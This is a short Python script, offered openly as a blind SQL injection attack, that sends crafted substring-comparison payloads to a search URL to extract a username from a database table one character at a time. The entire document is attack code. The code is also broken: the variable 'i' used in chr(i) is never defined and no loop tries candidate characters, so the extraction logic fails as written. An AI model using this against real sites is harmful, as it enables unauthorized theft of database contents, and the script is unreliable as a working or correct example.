import requests

# Function to perform a blind SQL injection attack
def blind_sql_injection(url, query, payload):
    result = ""
    position = 1
    while True:
        # Construct the SQL injection payload
        inject = f"{payload} and substring(({query}), {position}, 1) = '{chr(i)}'--"
        # Make the HTTP request with the payload
        response = requests.get(url + inject)
        # Check if the response indicates a successful injection
        if "Success" in response.text:
            result += chr(i)
            position += 1
        else:
            break
    return result

# Example usage
url = "http://example.com/search.php?query="
query = "SELECT username FROM users WHERE id=1"
payload = "1' OR 1=1 AND "
result = blind_sql_injection(url, query, payload)
print("Username:", result)
